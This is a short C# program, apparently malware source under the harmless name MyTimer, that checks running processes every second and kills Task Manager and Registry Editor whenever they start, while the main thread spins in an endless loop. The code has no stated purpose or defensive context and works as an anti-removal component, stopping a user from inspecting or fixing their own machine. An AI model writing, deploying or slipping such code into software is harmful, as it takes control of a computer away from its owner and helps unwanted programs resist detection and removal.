using System.Diagnostics;
using System.Timers;

public class MyTimer
{
	public static void Main()
	{
		new Process();
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.Interval = 1000.0;
		timer.Enabled = true;
		while (true)
		{
		}
	}

	public static void OnTimedEvent(object sender, ElapsedEventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "regedit")
			{
				process.Kill();
			}
		}
	}
}
